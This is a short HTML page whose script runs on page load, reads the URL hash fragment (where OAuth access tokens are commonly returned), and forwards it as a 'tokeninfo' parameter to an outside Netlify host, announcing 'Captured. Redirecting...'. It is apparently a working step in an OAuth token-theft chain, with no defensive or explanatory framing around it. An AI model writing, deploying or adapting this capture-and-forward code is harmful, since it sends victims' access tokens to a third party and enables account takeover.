<head>
  <title>Redirecting with Token</title>
  <meta charset="UTF-8" />
  <script>
    window.onload = function () {
      const hash = window.location.hash;
      if (!hash) {
        document.body.innerText = "‚ùå No hash fragment found in the URL.";
        return;
      }

      // Strip the hash (#) and encode safely
      const cleanHash = encodeURIComponent(hash.slice(1));

      // Redirect to payload page with tokeninfo
      const finalUrl = "https://684ff57e2f2790ada6c42b4c--statuesque-vacherin-9a305b.netlify.app/?tokeninfo=" + cleanHash;
      document.body.innerText = "üîÅ Captured. Redirecting...";
      window.location.href = finalUrl;
    };
  </script>
</head>
